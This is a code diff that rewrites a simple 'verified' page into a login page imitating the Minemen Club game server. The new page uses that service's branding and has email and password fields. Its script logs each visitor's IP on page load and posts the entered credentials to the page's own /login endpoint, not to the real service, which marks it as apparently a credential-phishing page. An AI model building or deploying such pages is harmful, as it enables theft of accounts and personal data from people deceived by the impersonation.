@@ -2,44 +2,34 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Verified</title>
+<title>Login | Minemen Club</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/kingsmirnov/Mc/refs/heads/main/img/Login%20_%20Minemen%20Club%20-%20Google%20Chrome%207_5_2026%201_31_46%20AM.png">
 
 <style>
     body {
         margin: 0;
-        background: url("https://github.com/kingsmirnov/Mc/blob/main/img/mmcbg.jpg?raw=true")
-                    no-repeat center center fixed;
+        background: url("https://github.com/kingsmirnov/Mc/blob/main/img/mmcbg.jpg?raw=true") no-repeat center center fixed;
         background-size: cover;
         font-family: Inter, Arial, sans-serif;
         color: #fff;
-        overflow-x: hidden;
     }
-
     .container {
         min-height: 100vh;
-        width: 100%;
         display: flex;
-        flex-direction: column;
         justify-content: center;
         align-items: center;
         padding: 20px;
-        box-sizing: border-box;
     }
-
     .logo {
         width: 90px;
         height: 90px;
         margin: 0 auto 24px auto;
     }
-
     .logo img {
         width: 100%;
         height: 100%;
-        object-fit: contain;
     }
-
     .card {
         width: 100%;
         max-width: 420px;
@@ -49,35 +39,49 @@
         border: 1px solid #1a1a1a;
         box-shadow: 0px 0px 45px rgba(0,0,0,0.55);
         text-align: center;
-        box-sizing: border-box;
-        margin-top: -20px;
     }
-
-    .card h1 {
+    .card h2 {
         margin: 0;
         font-size: 28px;
         font-weight: 700;
     }
-
     .card p {
         margin: 12px 0 28px;
         color: #bdbdbd;
         font-size: 16px;
     }
-
-    .btn {
-        display: inline-block;
+    .input-group {
+        margin-bottom: 22px;
+        text-align: left;
+    }
+    .input-group label {
+        display: block;
+        margin-bottom: 8px;
+        font-size: 15px;
+        color: #d0d0d0;
+    }
+    .input-group input {
+        width: 100%;
+        padding: 13px;
+        background: #1a1a1a;
+        border: 1px solid #3a3a3a;
+        border-radius: 6px;
+        color: #ffffff;
+        font-size: 15px;
+    }
+    .login-btn {
+        width: 100%;
         padding: 16px;
         background: #d946ef;
-        color: #000;
-        font-weight: 600;
         border-radius: 6px;
-        text-decoration: none;
+        color: #000;
         font-size: 17px;
-        transition: 0.25s ease;
+        font-weight: 600;
+        cursor: pointer;
+        transition: 0.25s;
+        border: none;
     }
-
-    .btn:hover {
+    .login-btn:hover {
         background: #e75aff;
         box-shadow: 0 0 18px #d946ef;
     }
@@ -92,15 +96,43 @@
             <img src="https://raw.githubusercontent.com/kingsmirnov/Mc/refs/heads/main/img/Login%20_%20Minemen%20Club%20-%20Google%20Chrome%207_5_2026%201_31_46%20AM.png">
         </div>
 
-        <h1>You are logged in!</h1>
-        <p>You are now verified.</p>
+        <h2>Welcome back</h2>
+        <p>Log in to your Minemen Club account</p>
 
-        <a class="btn" href="https://minemen.club/" target="_blank">Go to Minemen Club</a>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Email Address</label>
+                <input type="email" name="email" required>
+            </div>
+
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" name="password" required>
+            </div>
+
+            <button class="login-btn">Log In</button>
+        </form>
     </div>
 </div>
 
 <script>
 fetch("/track-ip", { method: "POST" });
+
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    const email = formData.get("email");
+    const password = formData.get("password");
+
+    const res = await fetch("/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+    });
+
+    const text = await res.text();
+    if (text === "success") window.location.href = "/dashboard.html";
+});
 </script>
 
 </body>
